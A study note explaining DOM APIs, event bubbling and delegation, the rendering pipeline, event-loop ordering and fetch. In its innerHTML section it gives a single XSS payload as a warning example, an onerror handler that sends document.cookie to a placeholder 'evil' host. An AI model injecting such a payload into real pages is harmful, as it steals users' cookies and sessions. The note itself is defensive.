# DOM & the Browser Event Loop — How Clicks Become Code (and Why UIs Jank)

**Created Date:** 2026-10-10
**Last Updated:** 2026-10-10
**Tags:** `#JavaScript`, `#WebBasics`, `#DOM`, `#EventLoop`, `#RenderingPipeline`, `#Async`, `#Fetch`, `#Browser`
**References:** MDN — "Introduction to the DOM", "Event bubbling/capturing", "Using the Fetch API"; HTML Living Standard — "Event loop", "Rendering"; *What the Heck is the Event Loop Anyway?* (Philip Roberts, JSConf EU); WEBdev "How Browsers Work"
**Status:** Draft
**Difficulty:** Intermediate
**Template:** A (Tech Note) — adapted
**Prerequisites:** [`04-javascript-language-core.md`](04-javascript-language-core.md) (functions, `this`, Promises), [`01-html-structure-and-semantics.md`](01-html-structure-and-semantics.md) (elements & nesting)

---

## 📌 Key Takeaways (TL;DR)
- **HTML is inert text; the DOM is a live, mutable object tree the browser builds from it.** JavaScript never edits your `.html` file at runtime — it edits the in-memory tree, and the browser repaints the pixels.
- **Every framework exists to manage DOM mutation.** React/Vue/Next.js are convenience layers over `createElement`/`textContent`; understanding the raw APIs means the frameworks stop being magic.
- **Events flow down (capture) and up (bubble).** Attach a listener on a *parent* and let child events bubble up — **event delegation** — and dynamic content + big lists "just work" with one listener.
- **`stopPropagation` stops the event travelling; `preventDefault` stops the browser's default behaviour.** They are unrelated; mixing them up is a classic bug.
- **The rendering pipeline is parse → DOM/CSSOM → render tree → layout → paint → composite.** *Layout* (reflow) is expensive; reading a layout property and then writing one forces a synchronous reflow — a "layout thrash".
- **One call stack + one event loop.** Web APIs (timers, network) run *off* the stack and push callbacks onto queues. **Microtasks (Promises) drain completely before the next macrotask (timers), and both drain before the next paint.**
- **`setTimeout(fn, 0)` is not immediate.** It waits for the current task, all microtasks, *and* typically the current paint — then fires at the earliest opportunity ≥ 0 ms.
- **A long synchronous task freezes the UI.** It blocks the stack, so neither events nor paint can run — this is what "jank" is. Fix: `await`, chunk the work, or use a Web Worker.

---

## 🧠 Detailed Notes

### 1. Core Concepts — HTML is a script, the DOM is the program

You write a text file. The browser reads the bytes, tokenises them, and builds a tree of **nodes**. That tree is the DOM (Document Object Model). It is the *only* thing JavaScript sees.

```
   home.html (text on disk)                DOM (live objects in memory)
   ────────────────────────                ─────────────────────────────
   <div id="app">                    ──►      Document
     <h1>Hello</h1>                           └─ Element <div id="app">
     <p class="msg">Hi</p>                       ├─ Element <h1>
   </div>                                        │    └─ Text "Hello"
                                                 └─ Element <p class="msg">
                                                      └─ Text "Hi"
```

**Three types matter:**

| Type | Represents | Example |
|---|---|---|
| `Document` | the whole tree, entry point | `document.querySelector(...)` |
| `Element` | a tag (has attributes, children) | `<div>`, `<p>`, `<button>` |
| `Node` | any tree node — Element *or* Text/Comment | `element.childNodes` includes text |

`Element` is a *subtype* of `Node`. Every `Element` is a `Node`, but not every `Node` is an `Element` (text and comments are nodes without tags). This is why `childNodes` counts whitespace text nodes and `children` does not.

**Why every framework exists:** direct DOM manipulation is verbose and easy to get out of sync with your data. A framework's job is to keep the **view (DOM)** and the **state (your objects)** consistent — usually by rebuilding a description of the UI and *diffing* it against the last one. React's JSX compiles to function calls that ultimately call `createElement`/`appendChild`. Once you have written those calls by hand, JSX is just notation.

---

### 2. DOM APIs — reading and mutating the tree

#### 2.1 Selecting elements

| API | Returns | Matches | Cost |
|---|---|---|---|
| `getElementById("x")` | one `Element` or `null` | by `id` only | fastest |
| `querySelector("css")` | first `Element` or `null` | any CSS selector | general |
| `querySelectorAll("css")` | a **static `NodeList`** | any CSS selector | snapshot (won't update) |
| `getElementsByClassName("c")` | a **live `HTMLCollection`** | by class | re-queries on access |

```js
const btn  = document.getElementById("save");
const first = document.querySelector(".card");
const all  = document.querySelectorAll(".card"); // NodeList — use forEach, not map
all.forEach(card => card.classList.add("visible"));
```

**Trap:** `querySelectorAll` returns a `NodeList` with `forEach` but **not** `map`/`filter` — convert with `[...all]` when you need array methods. And a `NodeList` from `querySelectorAll` is a *snapshot*; `getElementsByClassName` is *live*, so it changes under you during iteration.

#### 2.2 Creating and inserting nodes

```js
const li = document.createElement("li");   // create (not yet in the tree)
li.textContent = "New task";                // set TEXT safely (no HTML parsing)
li.classList.add("task");
li.dataset.id = "42";                       // writes data-id="42"
list.appendChild(li);                        // insert at end
list.prepend(li);                            // insert at start
li.insertAdjacentHTML("beforeend", "<span>!</span>"); // parse & insert HTML
```

*Build a node, configure it, then attach it.* Attaching last means the browser only computes layout once for the finished subtree.

#### 2.3 `innerHTML` vs `textContent`

| | `innerHTML` | `textContent` |
|---|---|---|
| Reads/writes | HTML markup | plain text |
| Parses HTML? | **yes** — tags become nodes | no — shown literally |
| XSS risk | **high** with user input | none |
| Speed | slower (parses) | faster |
| Use for | trusted, static markup | **any** user-supplied string |

```js
el.textContent = "<b>hi</b>";  // shows the literal text: <b>hi</b>
el.innerHTML   = "<b>hi</b>";  // shows bold hi
```

**The XSS seed (bridge to security/01):** `innerHTML` runs the browser's HTML parser on whatever you give it. If that string came from a user (a comment, a name, a URL query), they can inject `<img src=x onerror="fetch('//evil/?c='+document.cookie)">` and steal data. **Rule: user data goes through `textContent` (or `createTextNode`), never `innerHTML`.** The full attack surface is in [`../../security/01-web-security-injection-xss-csrf-session-hijacking.md`](../security/01-web-security-injection-xss-csrf-session-hijacking.md).

#### 2.4 Classes, data attributes, traversal

```js
el.classList.add("active"); el.classList.toggle("open");
el.dataset.userId = "7";       // → data-user-id="7"; read back el.dataset.userId

el.parentElement;              // parent Element
el.children;                   // Element children (no text nodes)
el.firstElementChild;          // first child Element
el.closest(".card");           // nearest ancestor matching selector ✅
```

`closest` is essential for event delegation: from a clicked element, walk up to the nearest meaningful container.

---

### 3. Events — turning input into code

#### 3.1 `addEventListener`

```js
button.addEventListener("click", (event) => {
  console.log("clicked", event.target);
});
```

`event.target` = the element that *fired*; `event.currentTarget` = the element whose *listener is running*. With delegation these differ.

#### 3.2 Bubbling vs capturing

An event is dispatched in **three phases**:

```
                    ┌─────────────┐
   CAPTURE (down)   │  document   │   capture listeners (3rd arg = true)
        │           └──────┬──────┘
        ▼                  │
   ┌─────────┐             │
   │  <body> │             │
   └────┬────┘             │
        ▼                  │
   ┌─────────┐   TARGET    │
   │ <button>│  (the event│
   └────┬────┘   happens) │
        │                  │
        │           ┌──────┴──────┐
   BUBBLE (up)      │  document   │   bubble listeners (default)
        └──────────►└─────────────┘
```

| | Capturing | Bubbling |
|---|---|---|
| Direction | root → target | target → root |
| Listener arg | `addEventListener(e, fn, true)` | `addEventListener(e, fn)` |
| Default | off | **on** |
| Typical use | rare — intercept early | **delegation, analytics** |

#### 3.3 `stopPropagation` vs `preventDefault`

| Call | Effect | Use when |
|---|---|---|
| `event.stopPropagation()` | stops the event from travelling further (up or down) | modal click should not reach a background close handler |
| `event.preventDefault()` | cancels the browser's **default action** (link navigation, form submit, checkbox toggle) | custom form validation, SPA links |
| `event.stopImmediatePropagation()` | also stops *other listeners on the same element* | rare |

```js
form.addEventListener("submit", (e) => {
  e.preventDefault();     // stop the page reload
  // … validate & send with fetch instead
});
```

Note: `preventDefault` does **not** stop bubbling, and `stopPropagation` does **not** stop the default action. They are orthogonal.

#### 3.4 Event delegation — one listener, many children

Instead of attaching a listener to every row, attach **one** to the parent and read `event.target`:

```html
<ul id="list">
  <li data-id="1">Task A</li>
  <li data-id="2">Task B</li>
</ul>
```

```js
document.getElementById("list").addEventListener("click", (e) => {
  const li = e.target.closest("li[data-id]");  // find the row under the click
  if (!li) return;                              // clicked the <ul> itself
  console.log("selected id:", li.dataset.id);
});
```

**Why delegation wins:**
1. **Performance** — 1 listener instead of N (important for 10,000 rows).
2. **Dynamic content** — rows added later automatically work; no re-binding.
3. **Less memory & fewer leaks** — one handler to remove, not N.

Caveat: only works for events that **bubble** (most do; `focus`, `blur`, `mouseenter` do not — use `focusin`/`focusout` instead).

---

### 4. Rendering Pipeline — from tree to pixels

```
   HTML ──parse──► DOM tree ─┐
                             ├──► Render tree ──► Layout ──► Paint ──► Composite
   CSS  ──parse──► CSSOM ────┘    (visible      (compute     (fill     (assemble
                                    nodes +       geometry:    pixels)   layers on
                                    styles)       x,y,w,h)              GPU)
```

| Stage | What happens | Invalidated by |
|---|---|---|
| Build DOM/CSSOM | parse markup & styles | HTML/CSS changes |
| Render tree | only *visible* nodes + computed styles | display/visibility changes |
| **Layout (reflow)** | computes positions & sizes | geometry changes (width, font, DOM insert/remove) |
| **Paint (repaint)** | fills pixels (colour, shadow) | colour/background/visibility (no geometry) |
| Composite | GPU draws layers | transform/opacity (cheap) |

#### 4.1 Reflow vs repaint

| | Reflow (layout) | Repaint |
|---|---|---|
| What changes | geometry — size/position | appearance only |
| Cost | **expensive** (recomputes layout, may cascade to ancestors/siblings) | cheaper |
| Triggers | `width`, `height`, `margin`, `padding`, `font-size`, adding/removing nodes, `display: none`, resizing window, **reading `offsetHeight` after writing** | `color`, `background`, `border-color`, `visibility` |

#### 4.2 Layout thrash — the concrete bug

Reading a layout property (`offsetHeight`, `getBoundingClientRect`, `scrollTop`) after a write forces the browser to **flush** the pending changes and recompute layout *synchronously*, right now. Inside a loop this repeats per iteration:

```js
// ❌ layout thrash: read then write, N times → N forced layouts
for (const el of items) {
  el.style.width = el.offsetWidth + 10 + "px";
}

// ✅ batch: read all first, then write all
const widths = items.map(el => el.offsetWidth);
items.forEach((el, i) => { el.style.width = widths[i] + 10 + "px"; });
```

#### 4.3 Animating without jank

For anything that runs every frame, animate **`transform`** and **`opacity`** — they can be handled by the compositor without layout or paint. And schedule work with `requestAnimationFrame`, which fires just before the next paint:

```js
function tick(t) {
  box.style.transform = `translateX(${t % 300}px)`;
  requestAnimationFrame(tick);            // runs once per frame, synced to display
}
requestAnimationFrame(tick);
```

Avoid animating `left`/`top`/`width` (triggers layout every frame).

---

### 5. The Event Loop (deep dive)

#### 5.1 The parts

```
        ┌───────────────┐
        │   CALL STACK   │  ← one synchronous task runs here to completion
        └──────┬────────┘
               │ schedules
        ┌──────▼─────────────────────────────┐
        │        WEB APIs (host)             │  timers, fetch, DOM events,
        │  run OFF the stack, concurrently   │  requestAnimationFrame
        └──────┬─────────────────────────────┘
               │ push callbacks when ready
        ┌──────▼──────────────┐   ┌─────────────────────┐
        │ MICROTASK QUEUE     │   │ MACROTASK QUEUE     │
        │ Promise.then,       │   │ setTimeout, setInterval,
        │ queueMicrotask,     │   │ I/O, UI event callbacks
        │ await continuation  │   └──────────┬──────────┘
        └──────────┬──────────┘              │
                   │  drain ALL first        │ one per loop turn
                   ▼                         ▼
        ┌───────────────────────────────────────────────┐
        │  EVENT LOOP:  pick next task → run to completion,
        │  drain microtasks, MAY RENDER, repeat          │
        └───────────────────────────────────────────────┘
```

#### 5.2 The rule, in one line

> **After the current task finishes, the event loop drains the entire microtask queue, then (optionally) repaints, then takes exactly one macrotask, then drains microtasks again, then repaints, …**

Consequences:
- A microtask that schedules another microtask can **starve** the loop (microtasks keep the queue non-empty; the loop never reaches a macrotask or a paint).
- `setTimeout(0)` runs in a *later* turn — after sync code, after all microtasks, and typically after the current frame's paint.

#### 5.3 Worked ordering examples

**Example A — sync + micro + macro**

```js
console.log("script start");
setTimeout(() => console.log("setTimeout"), 0);
Promise.resolve()
  .then(() => console.log("promise1"))
  .then(() => console.log("promise2"));
console.log("script end");
```
```text
script start     ← sync
script end       ← sync
promise1         ← microtask 1
promise2         ← chained microtask (queued by promise1)
setTimeout       ← macrotask (next turn)
```

**Example B — `await` is a microtask**

```js
async function f() {
  console.log("f start");
  await null;                 // everything after `await` runs as a microtask
  console.log("f after await");
}
console.log("a"); f(); console.log("b");
```
```text
a
f start          ← runs synchronously until the await
b                ← outer script continues
f after await    ← continuation resumed in the microtask queue
```

**Example C — `queueMicrotask` joins the same queue**

```js
setTimeout(() => console.log("timeout1"), 0);
Promise.resolve().then(() => console.log("micro1"));
queueMicrotask(() => console.log("micro2"));
console.log("sync");
```
```text
sync             ← current task
micro1           ← microtasks, in scheduling order
micro2
timeout1         ← next macrotask
```

#### 5.4 Why `setTimeout(0)` is not immediate

The `0` is a *minimum* delay, not a command. The callback cannot pre-empt the running task or the microtask queue, and browsers clamp small timeouts (often ≥ 4 ms after nested timers). It fires on the **next** turn of the loop — after sync code, after microtasks, and normally after a paint.

#### 5.5 Jank — the common failure

If synchronous code runs for 500 ms, the stack is occupied for 500 ms. During that time: no timers fire, no click handlers run, and **no paint happens** — the page is frozen. This is jank, and it is a *scheduling* bug, not a "slow code" bug.

```js
// ❌ blocks the loop: UI frozen for the whole loop
for (let i = 0; i < 1e9; i++) { /* … */ }

// ✅ yield periodically so events and paint can run
async function process(items) {
  for (const item of items) {
    heavy(item);
    await new Promise(r => setTimeout(r, 0)); // hand control back to the loop
  }
}
```

The fix: make long work **asynchronous** (yield between chunks), or move it off the main thread to a **Web Worker**.

---

### 6. `fetch` — the browser's network call (client-side AJAX seed)

`fetch` returns a **Promise**. Crucially, the response's *body* is a stream, so you need a second step to read it:

```js
async function loadTasks() {
  try {
    const res = await fetch("/api/tasks?limit=10");
    if (!res.ok) throw new Error(`HTTP ${res.status}`);   // fetch only rejects on network error!
    const tasks = await res.json();                        // parse the JSON body
    render(tasks);
  } catch (err) {
    console.error("network or parse error:", err);
  }
}

function render(tasks) {
  const list = document.getElementById("list");
  list.replaceChildren();                                  // clear safely
  for (const t of tasks) {
    const li = document.createElement("li");
    li.textContent = t.title;                              // textContent, not innerHTML
    list.appendChild(li);
  }
}
```

**Error-handling gotcha:** `fetch`'s Promise rejects only on a *network* failure (DNS, offline, CORS). A 404 or 500 still resolves with `res.ok === false` — you must check `res.ok` and `res.status` yourself.

**Why this is the "AJAX seed":** this is client-side AJAX in raw form — fetch data as JSON, then update the DOM without a full page reload. Pagination in [`../web_server/08-advanced-features-pagination-wysiwyg-upload.md`](../web_server/08-advanced-features-pagination-wysiwyg-upload.md) is built on exactly this: request a page, append rows, update a "next" button. The server side that answers with JSON is the Express/PostgREST layer, and the CSRF/CORS rules that guard it live in [`../security/01-web-security-injection-xss-csrf-session-hijacking.md`](../security/01-web-security-injection-xss-csrf-session-hijacking.md).

> **Why it matters:** async correctness and jank-free UIs are precisely what "client side" means in the course's AJAX chapter. A page that blocks on a synchronous loop, or that re-renders itself while a fetch is in flight, is *technically working* and *practically broken*.

---

## 📊 Comparison Tables (quick reference)

**innerHTML vs textContent**

| | `innerHTML` | `textContent` |
|---|---|---|
| Parses HTML | yes | no |
| XSS with user input | dangerous | safe |
| Use | trusted static markup | **all user data** |

**Reflow vs repaint triggers**

| Reflow (layout) | Repaint only |
|---|---|
| `width`/`height`, `margin`, `padding`, `font-size`, insert/remove nodes, `display:none`, `getBoundingClientRect` after a write | `color`, `background`, `border-color`, `visibility`, `outline` |

**Bubbling vs capturing**

| | Bubbling | Capturing |
|---|---|---|
| Direction | target → root | root → target |
| Listener arg | default | `true` |
| Best for | delegation | early interception |

---

## 🔗 Tech Cross-References (Section K)

- **DOM ↔ JavaScript** — the DOM is the *live object tree*; `04-javascript-language-core.md` is the language model (types, Promises, closures) that this note's event listeners and microtask queue run on. See [`../04-javascript-language-core.md`](./04-javascript-language-core.md).
- **Event loop ↔ Server (Node)** — the same single-threaded loop, two runtimes: on the browser it drives clicks and `fetch`; on the server it drives requests. Knowing one makes the other predictable. See [`../web_server/04-routing-in-express.md`](../web_server/04-routing-in-express.md) and [`../web_server/02-web-server-nginx-apache-express.md`](../web_server/02-web-server-nginx-apache-express.md).
- **DOM ↔ Databases** — a rendered list is *rows drawn into elements*; re-rendering the whole node on every `fetch` is the N+1 of the front-end. See [`../databases/08-db-bottlenecks-indexing-and-caching.md`](../databases/08-db-bottlenecks-indexing-and-caching.md) and [`../web_server/08-advanced-features-pagination-wysiwyg-upload.md`](../web_server/08-advanced-features-pagination-wysiwyg-upload.md).
- **CSR ↔ SSR** — this note's `fetch` + DOM path *is* client-side rendering; the alternative is server-rendered pages. See [`../web_server/01-static-dynamic-ssr-vs-csr.md`](../web_server/01-static-dynamic-ssr-vs-csr.md).

## 📝 Research Journey

- **Why:** The syllabus puts client-side scripting (3.1) and AJAX (4.5) on the browser, and I could not treat the browser as a black box anymore. I wanted to know *what actually happens* between a click and a pixel — the mechanism under every framework I will use.
- **Struggle:** The hardest idea was that `setTimeout(0)` is *not* immediate. I had a mental model of "0 means now". Seeing that a `Promise.then` scheduled after a `setTimeout` still logs *first* forced me to stop thinking in lines of code and start thinking in *queues and turns*.
- **Aha moment:** Event delegation. One listener on a `<ul>` replacing hundreds on `<li>`s — and it keeps working when rows are added later. The bubble phase finally had a *purpose*, not just a definition to memorise.
- **Career link:** As an AI Engineer in Economics/Business, most of what people call "the AI product" is a client app — a chat window, a dashboard, a table that paginates model output. Those are all DOM + events + `fetch`. When a business says "the dashboard feels slow", the fix is almost always in this note: layout thrash, a blocking loop, or a fetch fired at the wrong time. Understanding the pipeline is what lets me diagnose that instead of guessing.

## 🔗 Related Topics

- [`../04-javascript-language-core.md`](./04-javascript-language-core.md) — the language this note runs on (Promises, `this`, closures).
- [`../../web_server/01-static-dynamic-ssr-vs-csr.md`](../web_server/01-static-dynamic-ssr-vs-csr.md) — CSR is exactly this note's `fetch` + DOM path, contrasted with server-rendered pages.
- [`../../security/01-web-security-injection-xss-csrf-session-hijacking.md`](../security/01-web-security-injection-xss-csrf-session-hijacking.md) — how `innerHTML` becomes XSS and how `fetch` interacts with CSRF.
- [`../../databases/README.md`](../databases/README.md) — where the JSON your `fetch` renders actually comes from.
- [`../01-html-structure-and-semantics.md`](./01-html-structure-and-semantics.md) — the markup the DOM is built from.
- [`../08-forms-fetch-and-multipart-upload.md`](./08-forms-fetch-and-multipart-upload.md) — forms + `fetch` for data entry and uploads.
- [`../../web_server/06-sessions-cookies-localstorage.md`](../web_server/06-sessions-cookies-localstorage.md) — client-side storage the browser exposes to this layer.
- [SUGGESTED] `bridge-rendering-pipeline-trace.md` — a single end-to-end trace (HTML → DOM → CSSOM → layout → paint) annotated with DevTools screenshots; would make §4 concrete.

## 🤔 Open Questions

- [ ] Does a microtask scheduled during a render always run before the next paint, or can the browser paint mid-drain? (Spec says microtasks drain to empty, but DevTools timing is worth measuring.)
- [ ] When exactly does the browser decide to render? Is it per animation frame, or only when it detects a visual change?
- [ ] For a data-heavy dashboard, what is the crossover where virtualization or a Web Worker beats plain DOM updates?

---
*The browser is not a document viewer with scripting bolted on. It is a single-threaded scheduler that occasionally draws — and your job is to not block it.*
